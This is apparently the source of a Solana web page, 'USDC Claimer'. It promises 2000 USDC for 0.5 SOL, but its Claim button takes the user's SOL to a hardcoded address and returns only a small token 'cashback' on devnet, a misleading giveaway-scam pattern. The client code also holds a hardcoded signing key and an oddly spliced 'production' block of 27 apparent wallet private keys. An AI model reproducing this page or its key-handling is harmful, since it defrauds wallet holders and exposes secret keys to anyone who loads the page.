/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "41c728XT1aQSRkp2V7bEadNKZL6TjDXCkZD2rSxy95dM6bYwARoW9b6U2phodfQ3Bthqq9GMdtk1VrLUUG12QghW"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5pgT8Vw17Yp9xCR5nYM2bc7mSf595MbQ6YhsJ3ndUH6zVpE126Hqxj24HnENVQdigRi7qvD22PfmF5WpEcrDtrV8",
  "key1": "EjxUzDhcWgRVscZSecoGgYMS1vazsbo7L1BQmWVAF489xhK3y27kTRneP7BH6RYuWJ8HQsbU82trD8FKsUZRQq8",
  "key2": "5DgwcCx7esB6inZyU3RGHGCps4PprZX9AQpCvD7D6Yd6hbEgBeRfh5TSei3jHpRaH8Ze58gBvaWkjEC9RXEP9Ba9",
  "key3": "3niuREnwMvHGNSRggnrCNi7wxpMaXokizV27sgMc18UJUWqWzVJcZDTkvRvG9SksXT4xarLq3Bx9XRniz52ZNLTZ",
  "key4": "2p8nnQJd5cg5SgYfrp7XnZ6XgR34WymGHQFTbKGtnaMbXovp9WK8oWAHfx4Db5v7jzfdSNtU3wH187vJRVF4AmM9",
  "key5": "5an67tvbagPHmTWWB9iF9WicosiwmjPibtoD6NM9CeQCKt6VEkbk7EBg1cQXK3Sa3J4fjVQNSQVV6ggZVw9gi5fe",
  "key6": "2UCXkjzd4dficg8FEK1SA4sQ3Rvz2widfw7JtQZhdDkTaKfGAygUbTbSpFz5gC1CmXPnYGvq3HAeP3dX6QngD1H7",
  "key7": "2kF4GSUEXoouJgB47YDBucHHhSk1BuXxVpRMVNV6bceE2AdCiTqk7zXfrbXDsNs16hNF8h3ASJSbRbvN2wzLpENx",
  "key8": "HWLrwSt6KFpwtB8fdQDsfP9hKJQPGESZ9uYn13Fp9AJnhr5GS6L78NmAFSufDa9kCWF5E34ZqjKAA3SBToPgNuE",
  "key9": "4tFgbNDzWQqSc26spBvxLDzpPjdaSTAFKBUwSs113mzceLK62u6HiADYSd71WaH6DSUFpuoEhYQ5t7SUQd6PXu6Z",
  "key10": "5meoU6x45tYj6mMLDYYgRwdyh9o1vBS92SXNKkyxAEQDygqXXjczpUvvjXmDo8EuNgtf7q9PoBHWMvdPfBpGJ6Kx",
  "key11": "59JAoMEekFRYjr1k5VAL5nQdpf3cuVoscuBLGZhhNvLAqeQpcsDRp9HyJ4aoKV7TfUihtvWtwJCr5Ecc4HquJx6W",
  "key12": "4taz9L4cyqFHGkS2Sw1zVYPPLfeDqu9w1rknsB14rAy9h6G226CAd9rDbUH2CB5qr9gKcvVgZFTd47jK5ZcfMz9L",
  "key13": "4yjeLeyZBFFdZWsrTHhW2SSCS57v4uC7WoEou1aRAhi4W7TyX2cKSkZSUCfKyDp996NEyQAwRQwYC24iFUVzp7R",
  "key14": "5ZyAU2u8rAvzb2G3deYanKXMiZAWmrBaY95cd9JwfawHuZ31kmLa7YewSJrFAYRf89X34HRoQGZt8hdVTEmBEr4",
  "key15": "5Jk7iDmSVdevxwJnnapa9a3sB9ZBizGWZg7sB4cTPKhdjeJdPtvx44zHhpKgvEedQHdheo6KBfYgwLFomxDEM4ZN",
  "key16": "3hN6ZXWnhVgJ6zyAV6ewAfBfPbxABxxFP3QBTedR7tEZHrwWuVVLvSA5foBLJBg1rtkq4wMCeSyJXHLSRvE1mBRy",
  "key17": "cDcXk8nMNxrwD9XvbvTxF8ptPVthdk8nPE69AJRf8UkBvUCgWee1yoca9GwvDRibmrzJBsP2jBZ93R3GMGxpwaQ",
  "key18": "2BFnNTUj1wt3HBREKo7Knd5EqH1ohyvyyT3ASiPSfuV1A9zYcpk1JFNGiURirXnqu3ET1zBJSDvtYuz7rJ1rVgSh",
  "key19": "5gZx7mqNUK7BmGkyuf4h7bg3RkofeXw7w663MJhMaJ2HJjGJebPnzZ4FYzt5Y9HtF82wDLY4sSiv2NyZvaA3Eyas",
  "key20": "TpxT4KoWg3ccdvziWq2CAcdmDKHB8eV6K33ghbedYzkp9kNdjvQJNxxZhDMaAP7mKqR66JzmBkvd5yHfJ6wor5Z",
  "key21": "5XeWXyZXhJ6f8GuAGQp7RJyUYdtieT2bHqLiBknkVVG3Gi65FV3REJ2c8k5diWzZ8AM6c4q9cRie4i7ncXLaJs67",
  "key22": "4yqYf4bFS4YX3vCTWT17hEQTzEt4KN6a1YU82AojSWVrUtJw9k75v54XbUEDCxubuiV9AEV1htjhbwdWb5yzDD68",
  "key23": "57ztY8KiXCx6tHgJZnX32dycM8EtJoh6nZstLha6zxfXccmPFtLyCEhK787C9DzqCm9ivhUDj2zarZeAKgcETWup",
  "key24": "58WFKXefHpHt8a2KrJ9soczuW4k2uPVZAj9zmZTvh5CidKHF21GjvJ7baaekNEg7tDT1i6gpa9rtDpRV3CGCehWp",
  "key25": "sNQm6bQXaD13KWobmzABNxoY27TjRvYC1tCwxC6UEF9JEYB5pv2vuqiSkTnaUv3Pfyng8xa3xrXfVgTbRJydJXF",
  "key26": "3JVBbbKQC5YdB4rXZFDaGjMs3nkRngqy8FMNNKqy8i1L9rgncsGyT65GLgpmdPa6iZLWPYD9Q65GxLvk1W2ydajP"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
